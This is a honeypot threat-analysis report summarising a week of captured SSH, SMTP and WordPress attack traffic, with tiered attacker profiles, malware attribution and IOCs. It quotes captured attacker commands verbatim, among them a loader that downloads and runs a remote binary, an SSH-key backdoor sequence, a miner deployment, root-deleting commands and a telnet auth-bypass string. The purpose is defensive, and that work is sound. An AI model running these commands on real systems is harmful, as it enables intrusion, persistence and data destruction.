# SESSION 21 — Multi-Sensor Honeypot Threat Analysis: One Week of Captures

**Date:** 2026-08-29 (data extended through 2026-08-30 02:37 UTC during analysis)
**Sensor host:** `ubuntu-4gb-hel1-2` (Hetzner Cloud VPS, 62.238.47.215)
**Emulated identity:** `app-prod-01`
**Capture window:** 2026-08-23 06:55 → 2026-08-30 02:37 UTC (~7 days)
**Sensors analysed:**
- Cowrie — SSH/Telnet (ports 22/23)
- mailoney — SMTP sink (localhost)
- WordPress HTTP honeypot (port 80, nginx → Python logger; window 08-28 → 08-29)

**Real admin SSH:** port 2200 — never touched by any activity in this report.
**Analyst:** Rich (gibbsthedev)
**Analyst test IP (excluded from all aggregates):** 104.241.55.33

> **Errata (added in session 40, 2026-09-24).** Three statements below are wrong or
> incomplete. See `SESSION-40-four-sensor-pull-and-corrections-2026-09-24.md` §8.
> 1. **Port 2535** (§C) is not an "SMTP submission variant" — submission is 587. No
>    payload to 2535 has been captured; the service is unknown.
> 2. **The `sshd` uploads** (§B.2) were not all zero-byte tests. Only hash `e3b0c442…`
>    is empty; the rest are real ELF binaries, identified in session 32 as **pan-chan**.
> 3. **"Multi-vector" promotion** (§G, method notes) needs research scanners filtered out
>    first. Every self-identifying IP seen on all four sensors in session 40 was a scanner.
>    `45.177.18.132`'s Nmap identification stands; the inference from breadth does not.

> **Method note:** this analysis was built from a **complete event-type inventory** of the
> Cowrie JSON (the `eventid` histogram in §A.1), not from ad-hoc greps. That inventory
> surfaced two categories missed on a first pass — **file uploads** (SCP-delivered payloads,
> incl. a full multi-arch cryptominer kit) and the true scale of **direct-tcpip proxy/pivot
> abuse** (1,024 requests). Both now have dedicated sections. Enumerate every event type
> before analysing — it is the master index of the dataset.

---

## Executive summary

Seven days of logs from three co-located honeypot sensors were analysed to separate
automated commodity traffic from genuine human intrusion, attribute malware artifacts to
known campaigns, and correlate actors *across* sensors and event categories.

Headline findings:

- **SSH (Cowrie):** 15,168 session connects / 19,477 commands / 606 downloads / 26 uploads.
  Only **~2% of sessions negotiated an interactive terminal** — traffic is ~98% scripted
  automation, sorting into **four adversary tiers** from commodity IoT botnet to unskilled
  human following a tutorial.
- **Full kill chain (31.16.87.114):** Discovery → Credential Access → Lateral Movement, using
  a password lifted from a decoy `.env`, captured across a continuous multi-hour session.
- **Multi-arch cryptominer kit (77.90.185.20):** a complete **redtail** kit (7 files,
  arm7/arm8/i686/riscv/x86_64 + `clean.sh`/`setup.sh`) SCP-uploaded and deployed — **twice**,
  two days apart, byte-identical. The strongest malware capture of the week.
- **Proxy/pivot abuse is a top-tier category, not a footnote:** **1,024 direct-tcpip relay
  requests**, **over half (515) to port 25 (SMTP spam relay)**, top destination Yandex mail.
  This ties directly to the SMTP sensor result (below).
- **SMTP (mailoney):** 328 *direct* connections were banner-only with zero engagement — but
  the mail-abuse traffic is real, arriving as **SSH pivots to external mail servers** instead.
  The two findings are the same threat seen from two angles.
- **HTTP (WordPress):** 1,108 requests, 96% GET — reconnaissance and secret/config hunting;
  minimal real brute-forcing. Tooling fingerprinted (feroxbuster, Nmap NSE, Censys).
- **Cross-sensor correlation** promoted two actors to multi-vector (`45.177.18.132` Nmap
  scanner; `45.198.224.26` IoT loader).
- **Campaign attribution (externally corroborated):** the most common SSH download is
  **Outlaw / Shellbot** (SSH-key persistence, circulating since 2018) — the *same* campaign
  captured in sessions 12–18 (the `mdrfckr` key). Our exact hash was independently captured by
  a SANS ISC operator in April 2026 (§H), turning this from inference into confirmed
  attribution.
- **CVE-2026-24061** telnet auth-bypass attempted 3× (`USER=-f root`) from 3 IPs.

No activity reached the real host. All destructive commands executed harmlessly against
Cowrie's emulated filesystem. **Note:** captured artifacts (`downloads/`, `tty/`) are being
rotated off disk while event logs persist — the malware *records* survive but the *samples*
are gone. See §H.

---

## PART A — SSH LAYER (Cowrie)

### A.1 Complete event inventory (the master index)

| eventid | count | eventid | count |
|---|---|---|---|
| command.input | 19,477 | client.size | 297 |
| session.connect | 15,168 | client.var | 181 |
| session.closed | 14,950 | login.failed | 119 |
| login.success | 12,105 | file_download.failed | 65 |
| client.version | 11,617 | direct-tcpip.ja4 | 37 |
| client.kex | 11,425 | client.fingerprint | 32 |
| session.params | 11,134 | **file_upload** | **26** |
| command.failed | 3,593 | telnet.error | 10 |
| telnet.option | 2,194 | session.input | 4 |
| **direct-tcpip.request** | **1,024** | telnet.exploit_attempt | 3 |
| file_download | 606 | client.malformed_packet | 3 |
| command.success | 457 | command.chpasswd | 1 |
| direct-tcpip.data / redirect / ja4h | 384 / 371 / 309 | | |

Interactive-terminal negotiation (`client.size`, 297) against 15,168 connects confirms
**~98% of traffic is non-interactive automation** — the backbone of the taxonomy below.

### A.2 Four-tier adversary taxonomy

#### Tier 1 — Commodity IoT / botnet automation (bulk of traffic)

High-volume, telnet-heavy, zero terminal negotiation. Connect → fixed
download/upload-and-execute → disconnect, often sub-second.

Dropper infrastructure (downloads):

| Host / URL | Payloads | Family signal |
|---|---|---|
| `185.93.89.72` | `mirai.arm/arm7/mips/mpsl` | Classic Mirai multi-arch loader |
| `176.65.139.196/bins/` | `kla.sh, px86, pmips, pmpsl, parm` | Distinct Mirai-variant kit |
| `176.65.139.136/satan_mips` | `satan_mips` | Same family |
| `2.26.136.128/twget.sh` | one script, 15+ fetchers | Gafgyt/Bashlite loader |
| `5.182.210.174/ok` | **hash varies per fetch** | Polymorphic; loader IP 45.198.224.26 (§D) |

Anti-honeypot fingerprinting (110.172.29.191 15,107 events; 5.35.107.110 14,564 events):
`echo -e "\x6F\x6B"` (tests for a real shell) + `uname -a` (arch recon) — checking for a
honeypot before committing a payload.

#### Tier 2 — Automated multi-vector scanner (45.177.18.132)

SSH timing alone suggested "semi-automated tool"; the HTTP layer **confirmed Nmap-driven**
(§C.3). SSH-side: a 9-session burst in ~27 s (automated credential scan), then sessions
clustering at almost exactly 300,000 ms (**client-side timeout**, not human pacing).
Per-session decomposition showed a scripted recon/destruction playbook (editor hunt, terminfo
probes, binary verification via `file`/`xxd`/`od`, `cat /.dockerenv` containment check,
`sysrq-trigger`/`dd` destructive tests, full decoy sweep) — logic reads human, session
mechanics are automated.

#### Tier 3 — Skilled human operator (31.16.87.114)

Strongest human evidence this week (full kill chain in §A.3). Tells:
- **Sustained interest with a real break:** 6 sessions 11:19–11:38, a **3h10m gap**, then
  14:48 straight to `cat api_credentials_dump.json`. Automation doesn't pause 3 hours to
  finish a job.
- **Investigative troubleshooting:** when `shutdown` failed → `which/type/file/cat shutdown`
  to understand *why* (Cowrie's realism held).
- **Clean permission test:** `touch VERYIMPORTANT.db` → verify → `rm`.

#### Tier 4 — Unskilled human following a script (109.156.106.243)

Same decoy trail, clumsier: literal `\n` copy-paste artifacts (`echo $SHELL\nexit;`), filename
typed as a bare command twice then `less` (absent) before `cat`, shallow follow-through, a
typo (`ls,-l`). Working from a pasted guide, not improvising.

### A.3 Case study — full kill chain (31.16.87.114), MITRE-mapped

**Phase 1 — Discovery (T1083, T1082):** enumerated `/opt/app`, `.env`, `docker-compose.yml`,
`/opt/app/.git/config`; `whoami`, `getent passwd`, `systemctl --failed`, `ip address`.

**Phase 2 — Credential Access (T1552):** swept `.secrets/smtp.env`, `id_rsa.bak`,
`.ssh/authorized_keys`, `.ssh/config`, `/opt/app/.env`, `credentials_dump.json`,
`api_credentials_dump.json`.

**Phase 3 — Privilege/identity pivot (T1548, T1078):** `sudo su -`, `sudo su - acampbell`.

**Phase 4 — Lateral Movement (T1021) — the key event:** used the decoy DB credential:
```
mysql -h 10.0.4.12 -u app_svc -p'Tr0ub4dor&3'
ssh app_svc@10.0.4.12
```
`Tr0ub4dor&3` is the exact planted decoy value (the XKCD joke password, used verbatim). The
actor **acted on stolen credentials to attempt movement to a second host** — a complete
Discovery → Credential Access → Lateral Movement chain, captured in full.

**Phase 5 — Destructive attempts (T1485/T1529, inert):** `rm -rf --no-preserve-root /`,
`rm -rf /`, `sudo rm -rf /`, `shutdown -h now`, `init 6`, in sequence with investigation
between attempts. **Exit:** clean (`df -h`, `exit`).

### A.4 Notable individual SSH observations

- **STARDUST-BD dedicated infrastructure:** `103.134.26.228–.231`, daily 08-24→08-28,
  thousands of events each; `whois` = one Bangladeshi hosting owner across all four.
- **Resource-theft (79.195.111.46):** fetched a real, current Plex `.deb`, tried
  `apt install`, then `top`/`htop`. Hijack-for-personal-infrastructure, not recruitment.
- **CGNAT clustering:** four `172.58.242.x`/`.243.x` addresses, identical terminal 49×22 — one
  T-Mobile mobile device, rotating IP.
- **Residential-ISP origin of both human actors:** 31.16.87.114 → Kabel Deutschland (DE);
  109.156.106.243 → BT (GB). No VPS/VPN. Direct-from-home or compromised home routers — open
  question.

---

## PART B — UPLOADS (SCP-delivered payloads, 26 events)

This category was invisible to download-based analysis — files were *pushed* via SCP/SFTP,
not fetched with wget/curl. It contains the week's most significant malware.

### B.1 redtail multi-architecture cryptominer kit (77.90.185.20) — top finding

A full 7-file kit uploaded and executed, then **re-uploaded byte-identical two days later**
(08-26 16:09 and 08-28 11:52). Confirmed hashes:

```
clean.sh        3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892
setup.sh        1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d
redtail.arm7    d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141
redtail.arm8    d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e
redtail.i686    8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70
redtail.riscv   3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39
redtail.x86_64  f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987
```

Deployment command (captured verbatim):
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; \
chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; \
mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ...
```

Behavioural read (more sophisticated than the commodity droppers):
- `clean.sh` first — remove traces / kill competing miners before installing.
- `setup.sh` — install the architecture-appropriate `redtail` miner.
- Self-deletes both scripts after running (`rm -rf`) — anti-forensics.
- `chattr -ia ~/.ssh/authorized_keys` — clears immutable/append-only flags *before* writing a
  persistence key, defeating a common hardening measure.
- Ships 5 CPU architectures — designed to infect whatever it lands on.

The identical redeploy 2 days later indicates a scheduled re-hit by the same operator. This is
the **redtail_bot campaign** referenced in the project KB, now captured as a multi-arch SCP
delivery with full deployment logic. **redtail is XMRig-based Monero cryptojacking.**

### B.2 Other uploads

- **`RDT_20260818_130355.mp4` (201.222.49.29, 08-25)** — an MP4 video
  (`b971896895f02b1e...`). The `RDT_`+datestamp filename is a **phone screen-recording**;
  someone SCP'd a personal video onto the honeypot — almost certainly a confused human who
  believed they were on their own device, or testing SCP. Harmless curiosity, genuinely
  unusual capture.
- **Zero-byte `sshd` uploads** (138.122.140.200, 115.190.181.231, 120.48.8.101,
  180.76.119.95, 194.113.195.96, 36.139.229.71) — hash `e3b0c44298fc1c14...` is the
  **empty-file SHA-256**. Uploading an empty file named `sshd` is a **write-access / binary-
  overwrite test** (probing whether the real `sshd` can be clobbered).
- **Shared-hash cluster** `6d1fe6ab3cd04ca5...` — same payload under random names (`Qd4pKvbJ`
  from 91.86.139.75; `dYmvSmXH` from 88.169.134.71) — one file spread across a small cluster.

---

## PART C — PROXY / PIVOT ABUSE (direct-tcpip, 1,024 requests) — major category

Attackers who log in and, instead of running commands, request the honeypot **forward a
connection to an external host** — using the box as an anonymising relay. Cowrie discards the
forward, but logs the intent, destination, and port. At 1,024 requests this is one of the
largest activity categories on the sensor and was under-weighted in the first draft.

### C.1 What they relay to — destination ports

```
515 → port 25     SMTP  (spam relay — over half of all pivots)
319 → port 80     HTTP  (scraping / click-fraud / scanning through your IP)
115 → port 2535   SMTP submission variant (more mail abuse)
 39 → port 53     DNS
 37 → port 443    HTTPS
```

**Mail abuse dominates:** 515 + 115 = 630 of 1,024 pivots target SMTP ports. The top single
destination is **77.88.21.158 (Yandex mail, mx.yandex.ru)** with 515 requests — a spam
operation testing whether it can bounce mail through your IP.

IP-reflection destinations (`ip-who.com` 50, `api.ipify.org` 21, `1.1.1.1` 39) are the tools
checking "what IP do I appear as?" before relaying — confirming the proxy works and shows the
honeypot's address, not theirs.

### C.2 Top relayers

```
185.246.128.133   176   dedicated proxy-abuse actor
193.46.255.86      61
94.154.35.215      60
2.57.121.112       54
176.53.159.196     39
195.178.110.137    13   (also seen: TLS ClientHello relay to dns.google:443)
```

### C.3 Link to the SMTP sensor (§B/Part E) — same threat, two angles

The mailoney sensor recorded **zero direct engagement** (§E) — the mail-abuse crowd never
completed a *direct* SMTP transaction against the honeypot. This section explains why:
**they aren't trying to talk to the honeypot's mail service; they're trying to relay outbound
to real mail servers (Yandex et al.) through the SSH pivot.** The two sensors captured the
same spam-relay threat from opposite ends. Direct-tcpip fingerprints (`ja4`/`ja4h`, 346
events) are available to correlate these relayers against known scanning tools.

---

## PART D — HTTP LAYER (WordPress honeypot)

### D.1 Volume and shape

1,108 requests (08-28 22:38 → 08-29 22:52 UTC). **1,065 GET / 23 POST / 20 HEAD** —
reconnaissance and file probing, not exploitation. Top sources: 213.209.159.175 (579),
34.34.254.172 (238), 45.177.18.132 (60).

### D.2 What they probe for

- **WordPress:** `/wp-login.php`, `/wp-config.php`, `/wp-admin/`, `/wp-includes/`,
  `/wp-content/uploads/`.
- **Secret/config leakage:** `/.git/HEAD`, `/.git/config`, `/.env`, `/terraform.tfstate`
  (+`.backup`), `/ssl.key`, `/sftp-config.json`, `/winscp.ini`, `/web.config`,
  `/storage/logs/laravel.log`, `/swagger` — the HTTP mirror of the SSH decoy sweep.
  **108 of these came from 213.209.159.175 alone.**
- **Router/IoT exploits on port 80:** `/HNAP1` (D-Link), `/evox/about` (AVTECH), `/sdk`
  (Hikvision).

### D.3 Tooling fingerprints (User-Agent)

| Tool / UA | Count | Meaning |
|---|---|---|
| `feroxbuster/2.13.1` | 13 | Content brute-forcer (34.34.254.172) |
| `Nmap Scripting Engine` | 55 | NSE HTTP probes (45.177.18.132) |
| `CensysInspect/1.1` | 10 | Internet census scanner |
| `GenomeCrawlerd` (Nokia) | 8 | Internet crawler |
| `Python-urllib/3.14` | — | Scripted requests |
| `MSIE 7.0 / Firefox 3.0 / Chrome 26` | 200+ | Spoofed legacy UAs — scanner tell |

Two scanners, two methods: 213.209.159.175 = broad secret/config sweep; 34.34.254.172 =
feroxbuster fuzzing `.git`/`.env` appended to every path.

### D.4 Credential brute-forcing (minimal)

23 POSTs total; login/xmlrpc (test IP excluded):
```
45.177.18.132   log=hi&pwd=hi                       (Nmap trivial probe)
135.136.3.39    log=poop&pwd=admin/poop/same/poop@IP (low-effort, matches joke user)
212.98.171.50   log=root&pwd=IGetHe;[Frp,Reddot     (the one genuine brute-force attempt)
```

---

## PART E — SMTP LAYER (mailoney)

- **328 SMTP sessions; 0 credentials captured;** `captured_mail/` empty. Every session is a
  lone outbound banner (`220 app-prod-01 ESMTP Service Ready`) then disconnect — no `AUTH`,
  `MAIL FROM`, or `DATA`. (Schema: `id, timestamp, ip_address, port, server_name,
  session_data, dest_ip, dest_port`.)
- **Assessment:** the direct SMTP surface saw connection-level reconnaissance only. This is
  *not* the whole SMTP-abuse story — the actual spam-relay activity arrived as **SSH pivots to
  external mail servers** (§C), 630 attempts. Read §C and §E together: mail abuse is a major
  theme on this sensor, just not via the direct SMTP port.

---

## PART F — SINGLETON & LOW-COUNT FINDINGS

- **CVE-2026-24061 telnet auth-bypass (3 attempts):** identical `USER=-f root` injection from
  **31.76.20.19** (08-24), **64.89.163.156** (08-25), **52.234.46.117** (08-28) — three IPs,
  three days, same exploit string. A `-f root` argument-injection style auth bypass over
  telnet.
- **Root password-change attempt (1):** **49.72.212.22** (08-27) ran `chpasswd` for root — a
  lockout/persistence attempt (change the owner's password after access).
- **Client-key rotation (client.fingerprint):** **139.19.117.131** presented **14 distinct SSH
  host keys** across its sessions — a scanning framework or deliberate key-based-tracking
  evasion. (104.241.55.33's 8 identical fingerprints = the analyst's own consistent client.)
- **`session.input` (4):** trivial/garbage input (`ddd`) from 120.157.1.205 — noise.

---

## PART G — CROSS-SENSOR CORRELATION

Set-intersection of SSH and HTTP source IPs (test IP excluded) returned five present on both:
```
192.248.150.180   45.177.18.132   45.198.224.26   64.33.237.174   74.82.47.4
```

**45.177.18.132 → confirmed Nmap-driven multi-vector scanner.** HTTP requests to
`/nmaplowercheck1787972799` (Nmap's signature path) under the `Nmap Scripting Engine` UA, plus
`/HNAP1`, `/evox/about`, `/sdk` and a `log=hi&pwd=hi` probe. One scanner sweeping SSH *and*
HTTP.

**45.198.224.26 → confirmed IoT botnet loader (resolves the polymorphic mystery).** On SSH it
ran the textbook loader one-liner for `5.182.210.174/ok`:
```
(cd /tmp||cd /var/tmp||cd /dev; rm -rf ok ok.1; busybox wget http://5.182.210.174/ok; \
 wget ...; /userfs/bin/wget ...; curl -O ...; busybox curl -O ...; chmod 777 ok; ./ok; \
 sh ok; busybox sh ok; rm -rf ok ok.1) >/dev/null 2>&1 &
```
The `cd` fallback chain, `busybox`/`/userfs/bin/wget` variants, and `chmod 777` are classic
IoT-loader idioms — confirming `5.182.210.174/ok`'s per-fetch hash variance as **polymorphic
server-side re-packing**.

**64.33.237.174 → a human exploring by hand** on both layers (browsed the joke `poop` user,
`cat please_read.txt`). `192.248.150.180` / `74.82.47.4` were single-`/`-GET mass scanners.

---

## PART H — CAMPAIGN ATTRIBUTION (Outlaw / Shellbot)

The two most widely observed SSH download hashes, resolved via open-source research (no VT key
on hand; corroborated through SANS ISC handler diaries):

| SHA-256 | Written to | Identity |
|---|---|---|
| `a8460f446be540...a1669f8f2` | `~/.ssh/authorized_keys` | Backdoor key — `trojan.shell/malkey`, VT first seen **2018-07-05** |
| `01ba4719c80b6f...aca546b` | `/etc/hosts.deny` | Companion — clears host-based access controls |

Matched signature of the **Outlaw / Shellbot** campaign (persistence comment **`mdrfckr`**),
first attributed to the Outlaw / Dota family by Trend Micro in 2018 [R1] and documented in
SANS ISC handler diaries and independent honeypot research for nearly seven years [R2–R5].
The key-write playbook (matches the sensor's zero-command sessions) is the canonical
`cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa …AAAB… mdrfckr">>.ssh/authorized_keys &&
chmod -R go= ~/.ssh` sequence: recreate `.ssh` → append the backdoor key → lock permissions,
often under 30 s, followed by clearing `/etc/hosts.deny`.

**Independent corroboration of our exact hash.** A May 2026 SANS ISC guest diary [R2]
independently reports the **same SHA-256** we captured —
`a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` — written to
`/root/.ssh/authorized_keys`, noting VirusTotal first ingested it on **2018-07-05** and that
the artifact has **not been rotated in ~8 years**. That diary observed 24 source IPs writing
this identical hash over one week in April 2026; our sensor observed the same hash from
117.50.122.20 (and the earlier sessions-12–18 capture). This is strong external validation:
the attribution is not our inference alone — the same file, same campaign, is being tracked by
other operators concurrently. The campaign is associated with **XMRig Monero cryptomining**
and **Shellbot (IRC backdoor)** deployment [R4, R5], which dovetails with the redtail (also
XMRig-based) kit captured this week (§B.1).

**Longitudinal link (this sensor):** the same campaign appeared in sessions 12–18 (the
`mdrfckr` key from 117.50.122.20). Its reappearance this week — same hash, same technique —
establishes one long-running family repeatedly striking the sensor over weeks.

**MITRE:** T1078.003 (Valid Accounts: SSH), T1098.004 (Account Manipulation: SSH Authorized
Keys), T1562 (Impair Defenses), T1496 (Resource Hijacking — the cryptomining objective).

**References**
```
[R1] Trend Micro (2018) — original Outlaw / Dota family attribution of the mdrfckr key.
[R2] SANS ISC, "New Malware Libraries means New Signatures" (guest diary, 2026-05-15)
     https://isc.sans.edu/diary/32986  — reports the identical SHA-256, VT-first-seen 2018-07-05.
[R3] SANS ISC, "DShield Honeypot Activity for May 2023" (G. Bruneau)
     https://isc.sans.edu/diary/29932  — same key-write playbook, Outlaw attribution.
[R4] SANS ISC, "Decoding the Patterns: Analyzing DShield Honeypot Activity"
     https://isc.sans.edu/diary/30428  — mdrfckr key + uploaded-file analysis.
[R5] Yoroi, "Outlaw" research  https://yoroi.company/research/outlaw  — campaign / crypto-botnet.
```

---

## PART I — INDICATORS OF COMPROMISE

**Malware kits / dropper hosts**
```
77.90.185.20            redtail cryptominer kit (SCP upload, 7 files, deployed 08-26 & 08-28)
185.93.89.72            mirai.arm / arm7 / mips / mpsl
176.65.139.196/bins/    kla.sh, px86, pmips, pmpsl, parm
176.65.139.136          satan_mips
2.26.136.128/twget.sh   Gafgyt/Bashlite loader (15+ fetchers)
5.182.210.174/ok        polymorphic loader; delivered by 45.198.224.26
```

**Key file hashes**
```
3f3a11bafabb1a35db913cfe51995f2e357d049e268860175876ae5a93d23892  redtail clean.sh
1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d  redtail setup.sh
d70f917e35813a7ae323e6b2b539d6dbbfc3a3a6599f1fed93430b14ca08b141  redtail.arm7
d1cac82f44b54b0fd244a9e4122811e9ae108a197c7a65a20fd2e7552683e68e  redtail.arm8
8e1a67a5c03b3cd818f046c7a1605afccc0ee5ce437a0d099881f1872b54bc70  redtail.i686
3f3bf218089d1488617d37f8a5116bb2791eb39ce06a1b5bc9a4cdfe5e94dd39  redtail.riscv
f0aa83bbbd2c75e2f71ec16029ee5fcfad59f3a8efa30a500b815f0f6c18d987  redtail.x86_64
a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2  Outlaw authorized_keys
01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b  Outlaw hosts.deny
f2e2ffc024ab99eb49fa207756481aa80713398142f30888aebace5706909b36  twget.sh payload
b971896895f02b1e...                                              RDT_*.mp4 (phone screen-rec)
```

**Notable source IPs**
```
31.16.87.114        Tier 3 — skilled human, full kill chain (DE residential)
109.156.106.243     Tier 4 — unskilled human, scripted (GB residential)
77.90.185.20        redtail cryptominer operator (SCP upload, 2 deployments)
45.177.18.132       Nmap-driven multi-vector scanner (SSH + HTTP)
45.198.224.26       IoT botnet loader, 5.182.210.174/ok (SSH + HTTP)
185.246.128.133     top proxy/pivot relayer (176 requests, mostly SMTP)
77.88.21.158        pivot DESTINATION — Yandex mail (515 relay attempts against it)
103.134.26.228-231  STARDUST-BD dedicated scanning infrastructure (BD)
117.50.122.20       Outlaw/Shellbot mdrfckr key-planter (also sessions 12-18)
139.19.117.131      client-key rotation — 14 distinct SSH host keys
49.72.212.22        root chpasswd persistence attempt
31.76.20.19 / 64.89.163.156 / 52.234.46.117   CVE-2026-24061 telnet exploit
110.172.29.191 / 5.35.107.110   anti-honeypot fingerprinting spikers
79.195.111.46       resource-theft (Plex install)
195.178.110.137     SSH forwarding/proxy abuse (also in pivot relayers)
213.209.159.175     HTTP secret/config sweep (579 reqs, 108 secret probes)
34.34.254.172       HTTP feroxbuster .git/.env fuzzer (238 reqs)
212.98.171.50       genuine WP credential brute-force
104.241.55.33       ANALYST TEST IP — exclude from all adversary analysis
```

**Attacker tooling fingerprinted**
```
feroxbuster/2.13.1  Nmap NSE  CensysInspect/1.1  GenomeCrawlerd(Nokia)  Python-urllib/3.14
```

---

## PART J — ANALYST METHOD NOTES

- **Inventory every event type first** (the `eventid` histogram). Building analysis on a
  couple of familiar event types (`command.input`, `file_download`) missed uploads and the
  true scale of proxy abuse. The histogram is the master index — read it before drilling in.
- Terminal-size negotiation is a cheap human-vs-bot filter (~98% here is automation).
- Session-duration clustering at round numbers (≈300,000 ms) reveals client-side timeouts.
- **Cross-sensor set-intersection (`comm -12`)** upgraded two actors to multi-vector and
  resolved the polymorphic-host question.
- **Read sensors together, not in isolation:** the "empty" SMTP result only made sense once
  the SSH pivot destinations (port 25 → Yandex) were pulled. Same threat, two sensors.
- User-Agent analysis names the toolchain for free; copy-paste artifacts grade operator skill.
- Hash attribution is achievable without a VT key via open-source handler-diary research.
- Always exclude the analyst's own test IP (104.241.55.33) from every aggregate.

---

## PART K — OPEN FOLLOW-UPS

- **Artifact retention is broken:** `downloads/` and `tty/` are empty despite 606 download and
  10,991 TTY-log events — samples are rotated off disk while JSON records persist. Fix
  retention (or auto-copy captures to R2) *before* the next window, or malware samples and
  keystroke logs are lost. The redtail binaries are already gone; only hashes remain.
- Automate VirusTotal lookups on captured hashes — currently manual.
- Confirm decoy `.env` internal IPs (`db.internal`, `10.0.4.12`) never overlap the real home
  LAN (192.168.8.x) — verified non-overlapping here; keep as a decoy-design rule.
- Feed these IOCs into the planned SIEM (Wazuh / GuardDuty) once stood up.
- Track redtail (77.90.185.20) and Outlaw for continued reappearance — longitudinal campaign
  tracking is the strongest portfolio thread. (Outlaw attribution is now externally
  corroborated — see §H references; a SANS ISC operator captured our exact hash in April 2026.)

---

## Sensor cross-reference summary

| Sensor / category | Volume | Character | Key finding |
|---|---|---|---|
| SSH commands | 19,477 | 98% automated; 4 tiers | Full kill chain (31.16.87.114) |
| SSH uploads | 26 | SCP-delivered payloads | redtail multi-arch kit ×2 |
| SSH downloads | 606 | dropper fetches | Outlaw/Shellbot attribution |
| SSH proxy/pivot | 1,024 | relay abuse | 630 → SMTP spam relay (Yandex) |
| SMTP direct | 328 | banner-only | no direct engagement (abuse via pivot instead) |
| HTTP | 1,108 | 96% GET, scan/secret-hunt | tooling fingerprinted |
| Cross-sensor | 5 shared IPs | — | 2 actors promoted to multi-vector |
| Singletons | — | — | CVE-2026-24061 ×3; root chpasswd; 14-key rotation |

---

*Analysis performed 2026-08-29/30 against ~7 days of Cowrie JSON, the mailoney SQLite store,
and the WordPress honeypot JSONL, driven by a complete event-type inventory. All attacker
activity ran against emulated honeypot surfaces only; the real host (admin SSH on port 2200)
was never affected. Captured binary artifacts have been rotated off disk (see §K); findings on
malware rest on event records and hashes. Outlaw attribution is sourced (§H references) and
independently corroborated by a SANS ISC operator who captured the identical hash in April
2026.*
